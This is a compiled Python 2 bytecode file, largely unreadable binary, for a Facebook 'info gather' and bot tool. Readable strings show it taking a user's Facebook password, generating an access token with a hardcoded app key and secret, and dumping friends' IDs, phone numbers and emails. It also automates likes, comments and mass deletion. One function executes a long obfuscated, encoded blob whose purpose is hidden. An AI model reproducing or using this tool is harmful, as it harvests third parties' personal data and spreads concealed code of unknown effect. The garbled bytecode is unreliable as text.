�
��[c           @   sF  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z e j d- k rl d Z d Z d Z	 n d Z d Z d Z	 y d  d l
 Z
 Wnx e k
 re	 d j d	 � GHd
 j d	 � GHd j d	 � GHd j d	 � GHe d GHd j d	 � GHd GHd GHe j �  n Xe e � e j d � g  Z g  Z g  Z d �  Z d �  Z d �  Z d �  Z d �  Z d �  Z d �  a d �  Z d �  Z d �  Z d �  Z d �  Z d �  Z d �  Z  d �  Z! d  �  Z" d! �  Z# d" �  Z$ d# �  Z% d$ �  Z& d% �  Z' d& �  Z( d' �  Z) d( �  Z* d) �  Z+ d* �  Z, d+ �  Z- e. d, k rBe �  e* �  n  d S(.   i����Nt   linuxt   linux2s   [0ms   [32;1ms   [31;1mt    s   _     _i,   s   o' \.=./ `os   (o o)s   ooO--(_)--Ooot    s   O S I Fs#   [!] Can't import module 'requests'
t   utf8c          C   s�   yY t  d d � j �  }  t j d |  � } t j | j � } | d } t j | d � WnZ t	 t
 f k
 r� d t GHd j d � GHt d t d	 t d
 GHd j d � GHd GHn Xd  S(   Ns   cookie/token.logt   rs+   https://graph.facebook.com/me?access_token=t   nameR   s   Fbi info gather tool proi,   t   [s   DEVELPOD BY ANAS CHAWDHARYt   ]s"   How to use >type help< press enter(   t   opent   readt   requestst   gett   jsont   loadst   textt   nt   appendt   KeyErrort   IOErrort   Wt   centert   G(   t   tokenR   t   aR   (    (    s	   Hunter.pyt   baliho+   s    
	c           C   s   d t  t f GHd  S(   Ns�  
                    %sINFORMATION%s
 ------------------------------------------------------

        programmer    Anas chawdhary
        nickname      Hunter
        Tool Name     Fb info gether tool
        Version       Full pro  Version
        Date          22/10/2018 updated
        Email         anaschawdhary157@gmail.com
       
        facebook contact

     https://web.facebook.com/Anas.chawdhary157

 * if you find any errors or problems , please 
contact me
(   R   R   (    (    (    s	   Hunter.pyt   show_program=   s    c           C   s   d t  t f GHd  S(   Ns"  
     %sCOMMAND                      DESCRIPTION%s
  -------------       -------------------------------------

           First give token Access by token command

  get_data      fetching all friends data
  get_info      show information about your friend

  dump_id       fetching all id from friendlist
  dump_phone    get all phone number from friendlist
  dump_mail     get  all emails from friend list
 dump_<id>_id   get all id from ur friends <spesific>
		      ex: dump_username_id

   token              Generate access token
   cat_token          show your access token
   rm_token           remove access token

   bot                open bot menu

   clear        clear terminal
   help         show help
   about        Show information about programmer
   exit         Exit the program
(   R   R   (    (    (    s	   Hunter.pyt   info_gaQ   s    c           C   s   d t  t f GHd  S(   Ns�  
   %sNumber                  INFO%s
 ---------   ------------------------------------

   [ 01 ]      auto reactions
   [ 02 ]      auto comment
   [ 03 ]      auto poke
   [ 04 ]      accept all friend requests
   [ 05 ]      delete all posts in your timeline
   [ 06 ]      delete all friends
   [ 07 ]      stop following all friends
   [ 08 ]      delete all photo albums

   [ 00 ]      back to main menu
(   R   R   (    (    (    s	   Hunter.pyt   menu_botm   s    c           C   s   d t  t f GHd  S(   Ns(  
   %sNumber                  INFO%s
 ----------   ------------------------------------

   [ 01 ]      like
   [ 02 ]      reaction 'LOVE'
   [ 03 ]      reaction 'WOW'
   [ 04 ]      reaction 'HAHA'
   [ 05 ]      reaction 'SAD'
   [ 06 ]      reaction 'ANGRY'

   [ 00 ]      back to menu bot
(   R   R   (    (    (    s	   Hunter.pyt   menu_reaction}   s    c         C   s�   d GHy t  j d � Wn t k
 r) n Xt d d � } yW t j d d |  �} t j | j � } | j	 | d � | j
 �  d GHd	 GHt �  Wnc t k
 r� d
 GHd GHt  j d � t �  n5 t j j k
 r� d
 GHd GHt  j d � t �  n Xd  S(   Ns   [*] Generate access token t   cookies   cookie/token.logt   ws'   https://api.facebook.com/restserver.phpt   paramst   access_tokens&   [*] successfully generate access tokens3   [*] Your access token is stored in cookie/token.logs#   [!] Failed to generate access tokens-   [!] Check your connection / email or passwords   [!] Connection error !!!(   t   ost   mkdirt   OSErrorR	   R   R   R   R   R   t   writet   closet   exitR   t   removet   maint
   exceptionst   ConnectionError(   t   datat   bR   R   (    (    s	   Hunter.pyR   �   s0    

c          C   s�   d GHt  d � }  t  d � } d } i d d 6d d 6|  d	 6d
 d 6d d 6d d 6d d 6d d 6| d 6d d 6d d 6} d |  d | d | } t j d � } | j | � | j i | j �  d 6� t | � d  S(   Ns+   [*] login to your facebook account         s   [?] Username : s   [?] Password : t    62f8ce9f74b12f84c123cc23437a4a32t    882a8490361da98702bf97a021ddc14dt   api_keyt   passwordt   credentials_typet   emailt   JSONt   formatt   1t   generate_machine_idt   generate_session_cookiest   en_USt   locales
   auth.logint   methodt   0t   return_ssl_resourcess   1.0t   vsG   api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=s`   format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=s   return_ssl_resources=0v=1.0t   md5t   sig(   t	   raw_inputt   hashlibt   newt   updatet	   hexdigestR   (   t   idt   pwdt
   API_SECRETR,   R@   t   x(    (    s	   Hunter.pyRF   �   s        S c          C   sX  y�t  d k r� d GHt j d t � }  t j d t � t j |  j � } x< | d d D], } d | d Gt j	 j
 �  t j d	 � qY W| d d St  d
 k r'd GHt j d t � }  t j d t � t j |  j � } x< | d d D], } d | d Gt j	 j
 �  t j d	 � q� W| d d St  d k r�d GHt j d t � }  t j d t � t j |  j � } x< | d D]0 } d | d d Gt j	 j
 �  t j d � qyW| d St  d k rGd GHt j d t � }  t j d t � t j |  j � } x< | d d D], } d | d Gt j	 j
 �  t j d � qW| d d St  d k r�d GHt j d t � }  t j d t � t j |  j � } x8 | d D], } d | d Gt j	 j
 �  t j d � q�W| St  d k r_d GHt j d t � }  t j d t � t j |  j � } x< | d d D], } d | d Gt j	 j
 �  t j d � q#W| d d Sd GHt j d t t f � }  t j d t � t j |  j � } x< | d d D], } d | d Gt j	 j
 �  t j d	 � q�W| d d SWne t k
 rd GHd GHt �  nD t j j k
 r7d GHd GHt �  n t k
 rSd  GHt �  n Xd  S(!   Nt   wallposts   [*] fetching all posts idsF   https://graph.facebook.com/v3.0/me?fields=home.limit(50)&access_token=sC   https://graph.facebook.com/putriy.kaeysha/subscribers?access_token=t   homeR,   s   [*] %s retrieved   RF   g�������?t   mesG   https://graph.facebook.com/v3.0/me?fields=feed.limit(500)&access_token=t   feedt   reqs!   [*] fetching all friends requestssC   https://graph.facebook.com/me/friendrequests?limit=50&access_token=s   [*] %s retrieved    t   fromg{�G�z�?t   friendss   [*] fetching all friends idsF   https://graph.facebook.com/me?fields=friends.limit(5000)&access_token=g����MbP?t   subssA   https://graph.facebook.com/me/subscribedto?limit=50&access_token=t   albumss   [*] fetching all albums idsE   https://graph.facebook.com/me?fields=albums.limit(5000)&access_token=sH   https://graph.facebook.com/v3.0/%s?fields=feed.limit(50)&access_token=%ss"   [!] failed to retrieve all post ids   [!] Stoppeds   [!] Connection Errors2   [!] Stopped                                      (   t   WTR   R   R   t   postR   R   R   t   syst   stdoutt   flusht   timet   sleepRF   R   t   botR*   R+   t   KeyboardInterrupt(   R   t   resultt   i(    (    s	   Hunter.pyRT   �   s�                         

c         C   sy  d GHd GHyKd } x2|  D]*} | | k r0 Pn
 | d 7} i t  d 6t d 6} d j | d � } t j | d	 | �} | d j d
 � d } y= d t d t | t d | d d  j d d � d GHWq t	 k
 rCy5 d t d t | t d | d j d d � GHWqDt	 k
 r?d t d t | t d GHqDXq Xq Wd GHt
 �  Wn t k
 rtd GHt
 �  n Xd  S(   Ns3   [*] All posts id successfuly retrieved            s	   [*] Starti    i   R!   t   types(   https://graph.facebook.com/{0}/reactionsRF   R,   t   _s   R   s   ] t   messagei(   s   
R   s   ...t   storys   ] Successfully likeds   [*] Done                   s!   [!] Stopped                     (   R   R^   R5   R   RT   t   splitR   R   t   replaceR   t   menu_reaction_askR[   (   t   postst   amountt   counterRT   t
   parameterst   urlt   sRF   (    (    s	   Hunter.pyt   like  s0    
=5)c         C   sm  d GHd GHy?d } x&|  D]} | | k r0 Pn
 | d 7} i t  d 6t d 6} d j | d � } t j | d	 | �} | d j d
 � d } y9 t d t | t d | d d  j d d � d GHWq t	 k
 r7y1 t d t | t d | d j d d � GHWq8t	 k
 r3t d t | t d GHq8Xq Xq Wd GHt
 �  Wn t k
 rhd GHt
 �  n Xd  S(   Ns1   [*] All posts id successfuly retrieved          s	   [*] Starti    i   R!   R`   s'   https://graph.facebook.com/{0}/commentsRF   R,   R_   R   s   ] i(   s   
R   s   ...Ra   s   ] successfully commenteds   [*] Dones   [!] Stopped(   R   R`   R5   R   RT   Rb   R   R   Rc   R   RZ   R[   (   Re   Rf   Rg   RT   Rh   Ri   Rj   RF   (    (    s	   Hunter.pyt   comment*  s0    
91%c         C   s  d GHd GHy� d } x� |  D]� } | d k r0 Pn  t  j d j d | d d t � � } t j | j � } y/ | d d	 } t d
 t | d t d GHWq t	 k
 r� t d
 t
 | d t d GH| d 7} q Xq Wd GHt �  Wn t k
 rd GHt �  n Xd  S(   Ns1   [*] All post id successfully retrieved          s	   [*] Starti    i2   sB   https://graph.facebook.com/{id}?method=delete&access_token={token}RF   R   t   errorR`   R   s   ] Faileds	   ] Removedi   s   [*] dones   [!] Stopped(   R   RT   R5   R   R   R   R   R   t   Rt	   TypeErrorR   RZ   R[   (   Re   Rg   RT   R   R   t   cek(    (    s	   Hunter.pyR(   J  s(    %!c         C   s
  d GHd GHy� d } x� |  D]� } | d k r0 Pn
 | d 7} t  j d | d d t f � } t j | j � } y3 | d	 d
 } t d t | d d t d GHWq t k
 r� t d t	 | d d t d GHq Xq Wd GHt
 �  Wn t k
 rd GHt
 �  n Xd  S(   Ns7   [*] All friend requests successfully retrieved        s	   [*] Starti    i2   i   s8   https://graph.facebook.com/me/friends/%s?access_token=%sRO   RF   Rm   R`   R   R   s   ] Faileds   ] Confirmeds   [*] Dones   [!] Stopped(   R   RT   R   R   R   R   R   Rn   Ro   R   RZ   R[   (   Re   Rg   RT   R   R   Rp   (    (    s	   Hunter.pyt   confirmd  s(    
!%)c         B   s   e  j d � d  Ud  S(   Ns�B  c        �  @   s�<  d  d l  Z  d d d d d d d d	 d
 d d d d d d d d d d d d d d d d d d d d d d  d! d" d# d$ d% d& d d' d( d) d* d	 d+ d  d, d d- d. d/ d0 d  d1 d d2 d3 d4 d5 d6 d* d7 d8 d9 d8 d: d; d< d= d- d> d? d@ dA d dB dC dD dE d d? dF dG d$ dH dI dJ dK d d dL dM dN dO dP dQ dR dS dT dU dV dW d= dX d dY dZ d[ d\ d+ d d] dU d? d^ d\ d_ dO d` d	 d da db d dc d9 dd de df dg d@ dh di d! dj dk d d dl dm d[ d9 dn do dH d0 dp d dq dr ds dn d: dB d dt d0 du d d dv d0 d d ds dM dZ dw d5 dx dy d dz d{ d| d d} d~ d dI d� d� dn d� d\ d� d� dZ d� d� d� d� d d� d� d� d� d� d� d� d� d� d� d� d� d> dp d dA d� d� d< d� d d$ d d d� d� d� dQ d� dV dA dq d� d9 dV dc d� d� d� d� d� d� d� d� dA dA dH d� d� d� d� d� d� d� d� d� dr d� d' d� dl d d8 d� d� d~ d di d[ d d� d� d� dV d� d d� dH d d� d� d� d d/ d d d� d d d� d d6 d� d  d& d d# d$ d� d& d d� d( d) d� d	 d+ d� d, d d� d. d/ d� d  d1 d� d2 d3 d� d5 d6 dj d7 d8 d4 d8 d: dD d< d= d{ d> d? d� dA d d~ dC dD d� d d? d� dG d$ d~ dI dJ d� d d dc dM dN d dP dQ dZ dS dT d� dV dW d� dX d df dZ d[ d) d+ d d� dU d? d� d\ d_ dh d` d	 d� da db d6 dc d9 dR de df d� d@ dh d� d! dj d9 d d d� dm d[ d� dn do d� d0 dp d� dq dr dk dn d: d{ d dt d� du d d� dv d0 d d ds de dZ dw d� dx dy de dz d{ d2 d d} d� d dI d} d� dn d� d\ d� d� dZ d� dE d� d� d d� d� d� d� d� d8 d� d� d{ d� d� d� d> dp d� dA d� d d< d� d� d$ d dG d� d� d� dQ d� d� dA dq d d9 dV d� d� d� dI d� d� d� d� d� d� dA dH d� d� d� d/ d� d� d d� d� dc d� d' d� dl d d� d� d� d� d di d d d� d d� dV d( d d� d� d d� d� d� d d0 d d d` d d dA d d6 d> d  d& dl d# d$ dn d& d d� d( d) d d	 d+ dt d, d d6 d. d/ d� d  d1 d' d2 d3 d� d5 d6 dE d7 d8 d� d8 d: d� d< d= d- d> d? d  dA d d� dC dD d/ d d? d8 dG d$ dR dI dJ d� d d dr dM dN d� dP dQ d� dS dT d� dV dW d� dX d d� dZ d[ d d+ d dY dU d? d� d\ d_ d� d` d	 dJ da db d� dc d9 dG de df d� d@ dh d� d! dj d� d d di dm d[ dx dn do d� d0 dp d� dq dr d� dn d: dA d dt d� du d du dv d0 d� d ds d� dZ dw d� dx dy d� dz d{ d� d d} d& d dI d^ d� dn dc d\ d� dF dZ d� d� d� d� d� d� d� d\ d� d� d� d� d� d� d� d� d� d> dp d{ dA d� d� d< d� dA d$ d d� d� d� d� dQ d� d� dA dq d� d9 dV dM d� d� d� d� d� d	 d� d� d. dA dH d� d� d� d d� d� d� d� d� d� d� d' d; dl d d� d� d� d* d di dz d d� d= d� dV d� d d� d� d d� dK d� d d� d d dB d d d� d d6 d� d  d& d� d# d$ d; d& d d= d( d) d� d	 d+ d  d, d d} d. d/ d� d  d1 d� d2 d3 d� d5 d6 d* d7 d8 d( d8 d: d; d< d= d- d> d? d� dA d d� dC dD dD d d? dF dG d$ d� dI dJ dE d d d( dM dN dO dP dQ d� dS dT d� dV dW d� dX d dY dZ d[ d\ d+ d dN dU d? d2 d\ d_ d� d` d	 d� da db d dc d9 d� de df d� d@ dh d� d! dj di d d dj dm d[ d� dn do d� d0 dp d� dq dr d! dn d: dd d dt d du d d� dv d0 d d ds d� dZ dw d� dx dy d| dz d{ d� d d} d{ d dI d d� dn d d\ d� d` dZ d� d� d� d� d2 d� d� d� d� d� d� d� d� di d� d� d3 d> dp d� dA d� d d< d� d/ d$ d d� d� d� d dQ d� d dA dq d� d9 dV d� d� d� d! d� d� dH d� d� d� dA dH d2 d� d� dA d� d� d� d� d� dU d� d' d
 dl d d� d� d� dE d di d d d� ds d� dV d| d d� dI d d� dg d� d d[ d d di d d d� d d6 dn d  d& d1 d# d$ d� d& d da d( d) d d	 d+ d[ d, d d< d. d/ d� d  d1 d� d2 d3 dt d5 d6 d� d7 d8 d d8 d: d d< d= dR d> d? d+ dA d d~ dC dD d� d d? d� dG d$ d] dI dJ d d d d] dM dN dR dP dQ dZ dS dT d dV dW d� dX d df dZ d[ d� d+ d dE dU d? d� d\ d_ da d` d	 d/ da db d6 dc d9 d� de df dn d@ dh d� d! dj d� d d d� dm d[ d� dn do d� d0 dp d$ dq dr d� dn d: d� d dt d� du d dX dv d0 dZ d ds d4 dZ dw d� dx dy d� dz d{ d� d d} d� d dI dJ d� dn d� d\ d� dY dZ d� d� d� d� d; d� d� d� d� d� dv d� d� dH d� d� d� d> dp d� dA d� d� d< d� d� d$ d d9 d� d� dj dQ d� d dA dq d� d9 dV d� d� d� d# d� d� d d� d� d� dA dH d� d� d� d( d� d� d� d� d� d# d� d' d� dl d d� d� d� d d di dC d d� d� d� dV d d d� d3 d d� d[ d� d d� d d d� d d d| d d6 d� d  d& d� d# d$ d5 d& d dk d( d) dp d	 d+ d% d, d d� d. d/ d� d  d1 d� d2 d3 da d5 d6 d� d7 d8 d� d8 d: dM d< d= dt d> d? d_ dA d d� dC dD d� d d? dT dG d$ d dI dJ d d d d� dM dN d� dP dQ d� dS dT d� dV dW da dX d d� dZ d[ d� d+ d dY dU d? d= d\ d_ dC d` d	 d� da db d� dc d9 d* de df d
 d@ dh d� d! dj d{ d d d� dm d[ d� dn do d� d0 dp d� dq dr d� dn d: dA d dt dF du d d> dv d0 d� d ds dz dZ dw d� dx dy d� dz d{ d� d d} dB d dI d� d� dn d& d\ d� d� dZ d� d� d� d� d< d� d� dK d� d� dV d� d� d� d� d� d� d> dp d� dA d� d� d< d� d d$ d d� d� d� d0 dQ d� d� dA dq du d9 dV dM d� d� d d� d� d� d� d� dQ dA dH d� d� d� d� d� d� d] d� d� d� d� d' d+ dl d dT d� d� d d di dv d d� d� d� dV dm d d� d� d d� dK d� d d� d d d� d d dH d d6 dz d  d& dr d# d$ dk d& d dn d( d) d� d	 d+ d	 d, d dj d. d/ dh d  d1 d0 d2 d3 d. d5 d6 d� d7 d8 d� d8 d: d; d< d= d- d> d? d� dA d dR dC dD d� d d? d~ dG d$ d� dI dJ d d d d� dM dN d� dP dQ d dS dT d� dV dW d, dX d dY dZ d[ d\ d+ d d� dU d? d d\ d_ dE d` d	 d3 da db d� dc d9 d� de df d" d@ dh d d! dj d� d d dp dm d[ dG dn do d: d0 dp d� dq dr d� dn d: d� d dt dz du d d dv d0 d8 d ds d dZ dw dc dx dy d_ dz d{ d� d d} d� d dI dk d� dn d d\ d� d� dZ d� d" d� d� d\ d� d� d� d� d� dH d� d� d� d� d� dk d> dp d� dA d� da d< d� d d$ d d� d� d� dt dQ d� d� dA dq d� d9 dV d� d� d� d� d� d� d� d� d� d� dA dH d� d� d� d� d� d� dP d� d� d d� d' d� dl d d� d� d� d� d di d[ d d� d� d� dV d� d d� d� d d� d d� d d� d d d� d d d� d d6 d� d  d& d8 d# d$ d� d& d da d( d) d� d	 d+ d� d, d d d. d/ dK d  d1 d0 d2 d3 dt d5 d6 dr d7 d8 d4 d8 d: d� d< d= d� d> d? d� dA d d� dC dD dK d d? dN dG d$ dl dI dJ dG d d d dM dN d� dP dQ d� dS dT dF dV dW d� dX d df dZ d[ d� d+ d d, dU d? d� d\ d_ d6 d` d	 dU da db d dc d9 dp de df d1 d@ dh d� d! dj d  d d d� dm d[ d= dn do d� d0 dp d� dq dr dk dn d: d� d dt dB du d dx dv d0 d� d ds d� dZ dw d� dx dy d~ dz d{ dG d d} d� d dI d� d� dn dl d\ d� d dZ d� d� d� d� d� d� d� d d� d� d� d� d� dh d� d� dW d> dp d� dA d� d d< d� d� d$ d d7 d� d� d( dQ d� dh dA dq d� d9 dV d� d� d� d d� d� ds d� d� d� dA dH d� d� d� d� d� d� d d� d� d� d� d' d� dl d d d� d� d d di d� d d� d� d� dV d8 d d� d d d� d d� d d0 d d d� d d d� d d6 dz d  d& d+ d# d$ d� d& d d� d( d) dc d	 d+ dp d, d d� d. d/ dX d  d1 d d2 d3 d� d5 d6 d. d7 d8 d� d8 d: d� d< d= dI d> d? d| dA d d& dC dD d� d d? d7 dG d$ d� dI dJ d� d d d� dM dN d: dP dQ d dS dT d5 dV dW d� dX d d� dZ d[ d� d+ d d4 dU d? d d\ d_ dC d` d	 d4 da db d� dc d9 d de df d
 d@ dh d� d! dj d{ d d d� dm d[ d� dn do d� d0 dp d� dq dr d� dn d: dA d dt dD du d d� dv d0 d� d ds d dZ dw d� dx dy d( dz d{ d- d d} de d dI d� d� dn d� d\ d� d� dZ d� d7 d� d� d� d� d� dz d� d� d1 d� d� d� d� d� d� d> dp d
 dA d� d; d< d� dA d$ d d^ d� d� d� dQ d� d� dA dq du d9 dV dM d� d� d� d� d� d	 d� d� d. dA dH d� d� d� dQ d� d� d� d� d� d� d� d' d; dl d d d� d� dE d di d� d d� d� d� dV d� d d� d� d d� d& d� d d� d d d� d d d� d d6 d d  d& d� d# d$ d d& d d' d( d) d* d	 d+ d- d, d d� d. d/ d* d  d1 d d2 d3 d d5 d6 dZ d7 d8 d� d8 d: d� d< d= d+ d> d? d@ dA d d� dC dD dE d d? dN dG d$ d� dI dJ d� d d d� dM dN dO dP dQ d dS dT d� dV dW d� dX d d; dZ d[ d� d+ d d� dU d? d8 d\ d_ d< d` d	 d� da db d_ dc d9 d� de df d� d@ dh d� d! dj d� d d d6 dm d[ d� dn do d� d0 dp d) dq dr dm dn d: d� d dt dQ du d dO dv d0 d7 d ds d� dZ dw d� dx dy d dz d{ d� d d} d� d dI d5 d� dn d� d\ d� dz dZ d� df d� d� d* d� d� d* d� d� d� d� d� d� d� d� d� d> dp d� dA d� dg dp d d� d$ d d0 d� d
 dM dQ d� d� dA dq dl d9 d� d� d� d| d� d� dM dZ d� d� d� dA dH dn d� d� d� d� d� d� d� d� d� d� d' d0 dl d du d� d� d� d di d� d d� d� d� dV d� d d� d; d d� d� d� d d( d d d� d d d� d d6 d� d  d& d� d# d$ d� d& d d d( d) d d	 d+ dE d, d d7 d. d/ d d  d1 dq d2 d3 d� d5 d6 d� d7 d8 d� d8 d: d) d< d= d" d> d? d� dA d d3 dC dD dc d d? d� dG d$ d[ dI dJ d d d d� dM dN dx dP dQ d� dS dT d/ dV dW d5 dX d d dZ d[ d� d+ d d dU d? d� d\ d_ d� d` d	 dA da db dw dc d9 d� de df d� d@ dh d� d! dj d# d d d� dm d[ d( dn do d� d0 dp d� dq dr d� dn d: d� d dt dB du d d� dv d0 d( d ds d� dZ dw d� dx dy d� dz d{ d d d} d~ d dI d� d� dn d� d\ d� d dZ d� d< d� d� dP d� d� d� d� d� do d� d� d� d� d� d@ d> dp d� dA d� d? d< d� d� d$ d d d� d� d� dQ d� dT dA dq d� d9 dV d d� d� d4 d� d� dk d� d� d dA dH d� d� d� d� d� d� dX d� d� d" d� d' d' dl d d� d� d� d� d di d� d d� d7 d� dV d� d d� d� d d� d& d� d d# d d d d d dJ d d6 d� d  d& d� d# d$ dW d& d d� d( d) de d	 d+ d� d, d d� d. d/ d� d  d1 d< d2 d3 dZ d5 d6 d� d7 d8 d� d8 d: d d< d= d� d> d? d dA d dr dC dD d� d d? dK dG d$ d) dI dJ d� d d d� dM dN d� dP dQ d� dS dT d dV dW dj dX d d dZ d[ d d+ d d� dU d? dU d\ d_ d� d` d	 d� da db dZ dc d9 d# de df d d@ dh d� d! dj d( d d d� dm d[ d� dn do d� d0 dp dG dq dr d� dn d: dF d dt d� du d d$ dv d0 d� d ds d> dZ dw d% dx dy d	 dz d{ d7 d d} d{ d dI de d� dn d\ d\ d� d� dZ d� df d� d� d� d� d� d' d� d� d� d� d� dU d� d� d� d> dp dZ dA d� d� d< d� d� d$ d d' d� d� d� dQ d� dv dA dq d~ d9 dV d% d� d� d5 d� d� d� d� d� d� dA dH d} d� d� dO d� d� dE d� d� d d� d' d8 dl d d d� d� d� d di dJ d d� dq d� dV d� d d� d� d d� d d� d d1 d d d d d dY d d6 d� d  d& d� d# d$ d� d& d d� d( d) d d	 d+ dI d, d d� d. d/ d) d  d1 d� d2 d3 d d5 d6 d� d7 d8 d� d8 d: d% d< d= d� d> d? d� dA d d  dC dD d" d d? d� dG d$ d� dI dJ d� d d dK dM dN d dP dQ d� dS dT d� dV dW d� dX d d� dZ d[ d? d+ d d� dU d? dV d\ d_ d� d` d	 d� da db d� dc d9 d� de df d� d@ dh d  d! dj d� d d dm dm d[ d: dn do d� d0 dp d� dq dr d� dn d: d d dt d~ du d dG dv d0 d1 d ds d� dZ dw d� dx dy dk dz d{ d d d} d\ d dI d� d� dn d� d\ d� dn dZ d� d� d� d� d� d� d� dR d� d� d� d� d� d{ d� d� d d> dp d� dA d� d: d< d� d� d$ d d� d� d� ds dQ d� d� dA dq d� d9 dV d: d� d� d� d� d� d� d� d� d( dA d> d9 d� dM d� d� ds d� d� d� d2 d� d� d0 dl d� d� d� d, d� d dE d� d d% d d� d� d d dU d~ d� d d� d� dp d� d� d� d9 d2 ds d} d d� d$ dy d< dG d� d d� d� d� db d( d} d� dH d> d� d� d$ dH d� d^ d� d� d dq d� d� d� d dc d� d] d	 d� da d~ d� d d7 d� d� d d9 d� d d7 d� d� d  d dQ d! dG d$ d� dI d� dv d� dt d) dW d� dX d� d� d� d� d� d� d� d� d� d~ d d� d� dt d� d- d� d= du d� d� d� d- d d` d� d� d� d� d: d d( d� d� d� d� d@ d� d� d! d d� d� d� d� dm d! d� d� d� d� d0 d d� dq d� d� d+ d+ d� d d d� dx dj d� dv d� d� d d dI d� d d dx d� dR dO dS d� d d� d d d( d� d� d� d d\ d� d d� d� d d� d� d� d� d� d� d! d� dk d� d? dU d8 dV d d> d d� dA d* d d& d% d� d$ d dj d" d� dU dQ d d� dA d. d� dx d3 d� d� dQ dk d� d- d� d� d� d1 dA d� d� du d d- d� d� d� d' d� d d� d
 d dl d� d� d� d� d d d d� d2 d	 d
 d� d4 d� d dU d d d� d� d� dp d� dw d� d d d# dA d d� d dq d d" d# d d� d� d� d� d( d� ds d	 d> d� d� d_ d� d. d^ d� dd d� d2 d� d� d5 d� d� d� d� d� d8 d~ d� dx d% d� d> di da dA d� d7 dh d  d� d d� d� d d d� dI d� dx d dt d3 d@ dB d� dP d� dd dc d� d� dV d� d� dX d� d� d� d� d� d+ d d� d� d� d� d\ d< d� d` d� d7 dk dm dh dc du d� d( d� d� d@ d� d� d! d d� d� d� d� dm d! d� d' d� d� d0 d dm dq d� d� d+ d: d� d d d� dO dj d� dv d� d� d d dI d� d� d dx d� dR d dS d� d d� dm d d( d� d� d� d d\ d� d d� d� d d� d� d� d� d� d� d! d dk d� d? dU d dV d d> d dA dA d* d d& d d� d$ d dj d* d� dU dQ d d dA d. d� dx d� d� d� dQ dk d{ d- d� d� d� d� dA d� d� du d� d- d� d� d� d d� d d� d
 d% dl d� d� d� d[ d d d d� d` d	 d
 d� d4 d� d dU d d d� d� d� dp d� d� d� d d d# d� d d� d dq d� d" d# d d� d� d� d� d( d� d� d	 d> d� d� d� d� d. d^ d� dz d d� d2 d� d� d5 d� d� d� d� d� d8 d~ d� d� d% d� d> di d� dA d� d7 dh d� d� d d� d� d d d� dI d� d� d dt d3 d@ dg d� dP d� dd du d� d� dV d� d dX d� d� d� d� d� d+ d d� d' d� d� d\ d< d d` d� d7 dk d	 dh dc du d� d� d� d� d@ d� d� d! d d� d� d� d� dm d! d� dN d� d� d0 d d� dq d� d� d+ d d� d d d� d dj d� dv d� d� d d dI d� d d dx d� dR dI dS d� d d� d� d d( d� d� d� d d\ d� d d� d� d d� d� d* d� d� d� d! d# dk d� d? dU dF dV d d> d d& dA d* d d& d d� d$ d dj d� d� dU dQ d d� dA d. d� dx d� d� d� dQ dk d d- d� d� d� dM dA d� d� du d� d- d� d� d� dG d� d d� d
 d. dl d� d� d� di d d d d� d� d	 d
 d� d4 d� d dU d d d� d� d� dp d� d� d� d d d# dr d d� d dq d� d" d# d d� d� d� d� d( d� d d	 d> d� d� d� d� d. d^ d� dI d d� d2 d� d d5 d� d� d� d{ d� d8 d~ d� d d% d� d> di d dA d� d7 dh d$ d� d d� d� d� d d� dI d� dL d dt d3 d@ dn d� dP d� dd dI d� d� dV d� dg dX d� d� d� d d� d+ d d� d� d� d� d\ d< d� d` d� d7 dk d dh dc du d� d* d� d� d@ d� d� d! d d� d� d� d� dm d! d� d� d� d� d0 d dv dq d� d� d+ dM d� d d d� d� dj d� dv d� d� d d dI d� d* d dx d� dR dA dS d� d d� d� d d( d� d� d� d d\ d� d d� d� d d� d� d\ d� d� d� d! d� dk d� d? dU d� dV d d> d d dA d* d d& d� d� d$ d dj d d� dU dQ d dt dA d. d� dx d d� d� dQ dk db d- d� d� d� d� dA d� d� du d� d- d� d� d� d� d� d d� d
 d dl d� d� d� dD d d d d� d� d	 d
 d� d4 d� d dU d d d� d� d� dp d� dG d� d d d# dh d d� d dq d d" d# d d� dA d� d� d( d� d� d	 d> d� d� d� d� d. d^ d� d� d d� d2 d� d� d5 d� d� d� d� d� d8 d~ d� d d% d� d> di d� dA d� d7 dh d� d� d d� d� d� d d� dI d� d� d dt d3 d@ d� d� dP d� dd d| d� d� dV d� d dX d� d� d� d� d� d+ d d� d2 d� d� d\ d< d. d` d� d7 dk d� dh dc du d� d d� d� d@ d� d$ d! d d� d� d% d� dm d! d� d\ d� d� d0 d d� dq d� d� d+ d� d� d d d� d{ dj d� dv d� d� d d dI d� d( d dx d� dR dY dS d� d d� d� d d( d� d� d� d d\ d� d d� d� d d� d� d? d� d� d� d! d� dk d� d? dU d� dV d d> d d� dA d* d d& d d� d$ d dj d� d� dU dQ d d4 dA d. d� dx d� d� d� dQ dk d2 d- d� d� d� d* dA d� d� du d d- d� d� d� d� d� d d� d
 d� dl d� d� d� d� d d d d� d� d	 d
 d� d4 d* d dU d d d� d� d� dp d� d d� d d d# d} d d� d dq d: d" d# d d� dy d� d� d( d� d d	 d> d� d� d� d� d. d^ d� d d d� d2 d d� d5 d� d� d� d9 d� d8 d~ d� d, d% d� d> di dP dA d� d7 dh d d� d d� d� dx d d� dI d� d� d dt d3 d� d� d� dP d� d, d/ d� d� dV d6 d� d� d< d\ d� d� d d� d d% dU d? d@ dv d& d d` d> d� d8 dw dh dc d� d� d� d� d� d@ d� d� dt d d� d d� d� d� d! d dn d d d� d d� dq d� d� d� d� d� d� d} d$ du dj dV d da d� dd� dI dZ db d d� d� d� dz dS d� d d) d� d d� dt d� d� d dq dm d� d� d� d� d] d d� d� d� d� d� d| d� d( d� d8 d d� d� d	 d d� dA d� d� d< d0 d� d� d� d� d� dx dU d� d� dE dA d� d� d� d� d# d� d� da dX d- d� d� d� d� d} d� d9 d� d� d- d? d� d� d� dW d� dJ d� d~ d� dJ d� d� dP dB d� d� d� d} d> g�Z dZ d" d" f \ Z Z d� d d d d d d d	 d
